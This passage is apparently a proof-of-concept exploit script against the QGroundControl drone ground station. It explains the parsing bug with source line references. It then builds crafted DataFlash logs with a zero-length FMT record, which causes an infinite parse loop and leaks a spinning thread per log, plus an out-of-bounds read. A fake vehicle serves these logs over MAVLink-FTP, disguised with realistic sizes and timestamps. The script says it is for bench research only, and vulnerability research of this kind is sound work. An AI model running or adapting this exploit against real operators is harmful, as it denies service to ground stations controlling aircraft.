...
# ---------------------------------------------------------------------------
# QGC-04 -- the VEHICLE hosts malicious DataFlash logs.
#
# Delivery chain, verified against QGroundControl master d62dcff:
#
#   OnboardLogController::_ftpListRoot()          AnalyzeView/OnboardLogs/
#     -> ftpManager()->listDirectory(AUTOPILOT1, "@MAV_LOG")      :957
#        (falls back to "/APM/LOGS" for ArduPilot if that errors) :30, :975
#     -> entries filtered to *.ulg / *.bin, format "F<name>\t<size>[\t<mtime>]"
#     -> operator clicks Download
#     -> ftpManager()->download(AUTOPILOT1, ftpPath, _downloadPath,
#                               localFilename, true)              :1218
#        NOTE checksize=true -- unlike @PARAM/param.pck, the log download DOES
#        verify bytesWritten == declared size, so we must declare truthfully.
#     -> saved as <name>.bin on the operator's disk
#     -> operator opens it in Analyze > Log Viewer
#     -> LogViewerDataFlashParser -> APMDataFlashUtility::parseFmtMessages
#
# QGC selects MAVFTP because we advertise MAV_PROTOCOL_CAPABILITY_FTP in
# AUTOPILOT_VERSION (capabilities=0xFBAF, bit 7 set) -- OnboardLogController :507.
#
# THE BUG (APMDataFlashUtility.cc, master d62dcff):
#   Both parse loops consume a 3-byte header then advance by (fmt.length - 3):
#
#       pos += 3;
#       const int payloadSize = fmt.length - 3;      // fmt.length is attacker u8
#       if (pos + payloadSize > size) { break; }     // negative -> guard passes
#       pos += payloadSize;                          // rewinds the cursor
#
#   fmt.length == 0  ->  payloadSize == -3  ->  NET ZERO MOVEMENT. The same
#   record is re-parsed forever. It bites in parseFmtMessages, during the format
#   scan, before a single message is iterated.
#
#   Observed live on Windows 11 (2026-08-26): the parse worker thread spins
#   permanently, the Log Viewer shows "Loading..." and never completes, and the
#   UI thread stays responsive -- so QGC reports no error at all. Each log opened
#   leaks one more spinning thread (thread count +1 per file, never reclaimed),
#   so a handful of logs consumes the machine's CPU.
#
#   fmt.length == 1 gives payloadSize == -2, i.e. net +1: a byte-at-a-time crawl
#   that terminates. Only 0 is a true non-advancing loop. That one-byte
#   difference is served here as the "stall" log, as a control.
# ---------------------------------------------------------------------------
...
def _fmt_record(msg_type, length, name, fmt, columns):
    """A complete FMT record: 3-byte header + 86-byte body."""
    ...
    assert len(body) == FMT_PAYLOAD_SIZE
    return bytes([HEADER1, HEADER2, FMT_TYPE]) + body


def _data_record(msg_type, body):
    return bytes([HEADER1, HEADER2, msg_type]) + body


def _pad_to(blob, target):
    """Pad with 0x00 so the log looks a plausible size in the Onboard Logs list.

    Safe: the hostile FMT sits near the front and the parse loop never advances
    past it, so nothing after the padding is ever read. For the benign log the
    padding is simply trailing zeros the header-resync scan walks over.
    """
    return blob + b"\x00" * max(0, target - len(blob))


def build_benign_log(pad_to=0):
    """A well-formed log that parses and renders normally -- the on-camera control."""
    out = _fmt_record(1, 4, "GPS", "B", "Status")
    for v in (0x03, 0x03, 0x04, 0x04):
        out += _data_record(1, bytes([v]))
    return _pad_to(out, pad_to)


def build_hang_log(pad_to=0):
    """fmt.length = 0  ->  payloadSize = -3  ->  net zero movement: infinite loop."""
    out = _fmt_record(1, 4, "TEST", "B", "x")
    out += _data_record(1, bytes([0x42]))
    out += _fmt_record(4, 0, "HANG", "B", "x")     # Length = 0
    out += _data_record(4, bytes([0x00]))          # cursor sticks here forever
    return _pad_to(out, pad_to)


def build_stall_log(pad_to=0):
    """fmt.length = 1 -> payloadSize = -2 -> net +1: crawls, but terminates."""
    out = _fmt_record(1, 4, "TEST", "B", "x")
    out += _data_record(1, bytes([0x42]))
    out += _fmt_record(3, 1, "SLOW", "B", "x")     # Length = 1
    out += _data_record(3, bytes([0x00]))
    return _pad_to(out, pad_to)


def build_overread_log(pad_to=0):
    """CWE-125: a format string declaring an 'a' field (64 bytes) on a 1-byte
    payload. parseMessage() takes no length argument at all, so `offset`
    accumulates from formatCharSize() with nothing to bound it."""
    out = _fmt_record(1, 4, "TEST", "B", "x")
    out += _data_record(1, bytes([0x42]))
    out += _fmt_record(2, 4, "EVIL", "Qa", "t,arr")   # 'Q'=8 + 'a'=64 declared
    out += _data_record(2, bytes([0x41]))             # ...1 byte supplied
    return _pad_to(out, pad_to)


# A fixed, plausible base timestamp for the log Date column (no wall-clock
# dependence, so runs are reproducible). 2026-08-26 09:00:00 UTC.
BASE_MTIME = 1787734800   # 2026-08-26 09:00:00 UTC

# Plausible ArduPilot log names/sizes for the Onboard Logs list.
LOG_SET = [
    # (filename,          builder,             padded size, label)
    ("00000041.BIN", build_benign_log,    1_182_720, "benign control -- opens normally"),
    ("00000042.BIN", build_hang_log,      1_431_552, "LENGTH=0  -> infinite loop, thread leak"),
    ("00000043.BIN", build_hang_log,      1_657_344, "LENGTH=0  -> infinite loop, thread leak"),
    ("00000044.BIN", build_stall_log,       947_200, "LENGTH=1  -> crawls, terminates (control)"),
    ("00000045.BIN", build_overread_log,    865_280, "CWE-125 64-byte over-read (silent)"),
]


def main():
    pre = argparse.ArgumentParser(add_help=False)
    pre.add_argument("--emit-only", metavar="DIR",
                     help="write the crafted .bin logs to DIR and exit (no MAVLink link)")
    pre.add_argument("--no-pad", action="store_true",
                     help="do not pad the logs to realistic sizes (tiny files, faster transfer)")
    args, rest = pre.parse_known_args()

    logs = []
    for name, builder, size, label in LOG_SET:
        blob = builder(0 if args.no_pad else size)
        logs.append((name, blob, label))

    if args.emit_only:
        os.makedirs(args.emit_only, exist_ok=True)
        for name, blob, label in logs:
            path = os.path.join(args.emit_only, name)
            with open(path, "wb") as fh:
                fh.write(blob)
            ok("wrote %s (%d bytes) -- %s" % (path, len(blob), label))
        return

    sys.argv = [sys.argv[0]] + rest
    v = FakeVehicle.from_cli("QGC-04 vehicle-hosted DataFlash log DoS")

    banner("QGC-04: the vehicle hosts malicious DataFlash logs over MAVLink-FTP")
    warn("BENIGN PoC. Authorized localhost/bench QGroundControl only. The logs")
    warn("contain no code -- only FMT records with hostile Length/format fields.")

    for idx, (name, blob, label) in enumerate(logs):
        # Register under the bare name; the resolver matches OpenFileRO paths by
        # basename, so "@MAV_LOG/00000042.BIN" finds it. Advertise the true size:
        # the log download passes checksize=true (OnboardLogController.cc:1218).
        v.add_ftp_file(name, blob)
        # kCmdListDirectoryWithTime reports a modification time; QGC renders it in
        # the Date column. Space the logs an hour apart so the list looks like a
        # normal flight day rather than five files with identical timestamps.
        v.add_ftp_dir_entry(name, size=len(blob), is_dir=False,
                            mtime=BASE_MTIME + (idx * 3600))
        observe("serving %-13s %9d bytes  -- %s" % (name, len(blob), label))

    v.start()
    attack("MAVFTP log server up. In QGC:")
    attack("  1. add a TCP link to this host:5760 and CONNECT")
    attack("  2. Analyze > Onboard Logs > Refresh   (the list above appears)")
    attack("  3. Download the logs")
    attack("  4. Analyze > Log Viewer > Open .bin   -- open the benign one first,")
    attack("     then 00000042.BIN and watch it sit on 'Loading...' forever")
    observe("expected: +1 permanently spinning thread per hostile log opened;")
    observe("QGC stays responsive and reports NO error at all.")
    v.serve_forever()
